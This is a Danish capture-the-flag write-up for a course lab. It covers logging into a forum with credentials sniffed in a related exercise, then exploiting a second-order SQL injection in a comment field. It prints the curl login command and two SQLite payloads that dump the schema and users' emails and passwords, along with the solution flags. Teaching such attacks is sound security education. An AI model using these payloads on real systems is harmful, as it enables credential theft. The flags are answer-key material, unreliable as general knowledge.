SQL injection (+ Web server login)

Second-order SQLi i et kommentarfelt med " + ||-konkatenering.

Web server login

Credentials carsten@netsec.aau.dk/mormor1932 stammer ikke fra denne opgave selv, de er opsnappet som klartekst-HTTP i den beslægtede Network sniffing-opgave (ARP-spoofing MITM på samme netsegment). Log ind med dem her:

curl -sk --resolve netsec-forum.dk:80:<ip> --resolve netsec-forum.dk:443:<ip> \
  -c jar --data-urlencode "email=carsten@netsec.aau.dk" \
  --data-urlencode "password=mormor1932" http://netsec-forum.dk/login
# forkerte creds -> 200 "Username and password does not match"
# korrekte       -> 302 + Set-Cookie: session=...

Appen bouncer http↔https: login over http redirecter til https, og / over http viser altid login-siden uanset cookie. Giv curl BÅDE --resolve ...:80: og :443:, send cookien, og følg redirects (-L). Det autentificerede forum viser flaget + en kommentar-form.

SQL injection: second-order i kommentarfeltet

Login-formen selv er parameteriseret (ingen injection der), men en gemt kommentar er injectable. Det klassiske '-breakout fejler her, INSERT'en bruger dobbelt-citationstegn om værdien, ikke single-quote. Når den oplagte payload fejler, prøv det andet anførselstegn i stedet for at opgive, kombineret med SQLite's ||-konkatenering for at lække en subquery tilbage via den viste kommentar:

" || (SELECT group_concat(sql,0x0a) FROM sqlite_master))--
" || (SELECT group_concat(email||0x3a||password,0x0a) FROM users))--

Skema-dumpet viser users(email, password); anden query afslører en skjult bruger you@found.it hvis "password" er flaget.

🚩 Vis løsning & eksempel-flag
  • Web server login: HKN{ga-wR-jNtYnh}
  • SQL injection: HKN{zN-Q3-g42fcS}

(per-instans)

Hvad du har lært

  • Injektion er ikke altid i login-formen; tænk second-order (data gemt nu, brugt i en query senere).
  • Variér breakout-tegnet: ' vs " afhænger af hvordan serveren bygger SQL'en.

Hvor ses dette igen?

Second-order injection er lumsk fordi input og sårbarhed er adskilt i tid: du gemmer noget harmløst-udseende (en kommentar) som FØRST bliver farligt når en senere query bruger det uden escaping. Derfor skal du teste injektion ved HVERT sted data genbruges, ikke kun der hvor du indtaster det. Og breakout-tegnet afhænger af serverens egen SQL-konstruktion: fejler ', så prøv ", for det afslører om strengen blev bygget med enkelt- eller dobbelt-citationstegn.
